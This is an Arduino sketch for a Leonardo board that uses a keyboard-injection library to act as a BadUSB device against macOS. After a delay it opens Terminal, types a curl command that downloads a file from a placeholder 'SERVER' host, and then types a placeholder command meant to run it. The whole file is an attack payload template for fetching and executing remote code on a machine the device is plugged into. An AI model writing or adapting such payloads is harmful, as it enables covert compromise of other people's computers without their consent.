#define kbd_es_es
#include <phukdlib_leonardo.h>

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarOSX("terminal");
  delay(3000);
  Keyboard.println("curl http://SERVER/path/to/file > file");
  delay(2000);
  Keyboard.println("INSERT COMMAND TO EXECUTE HERE");
  while(1);
}
